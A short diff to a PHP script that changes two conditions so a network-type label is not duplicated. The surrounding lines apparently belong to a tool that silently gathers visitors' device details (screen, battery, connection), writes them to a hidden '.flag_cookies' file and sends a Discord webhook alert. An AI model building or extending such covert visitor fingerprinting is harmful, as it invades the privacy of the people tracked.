@@ -304,7 +304,7 @@ $terminal_output .= "[+] Screen: " . nxLabel($screen_resolution) . "  |  Scale: 
 $terminal_output .= "[+] Battery: " . nxLabel($battery_level) . "  |  " . nxLabel($battery_charging, 'N/A') . "\n";
 
 $net_label = nxLabel($connection_type);
-if (!empty($connection_effective) && $connection_effective !== $connection_type) {
+if (!empty($connection_effective) && strpos($net_label, $connection_effective) === false && $connection_effective !== $connection_type) {
     $net_label .= " ({$connection_effective})";
 }
 if (!empty($connection_downlink)) {
@@ -362,7 +362,7 @@ file_put_contents($data_dir . '/.flag_cookies', $terminal_output);
    4. DISCORD WEBHOOK ALERT
    ════════════════════════════════════════════════════════════ */
 $discord_net = nxLabel($connection_type);
-if (!empty($connection_effective) && $connection_effective !== $connection_type) {
+if (!empty($connection_effective) && strpos($discord_net, $connection_effective) === false && $connection_effective !== $connection_type) {
     $discord_net .= " ({$connection_effective})";
 }
 if (!empty($connection_downlink)) {
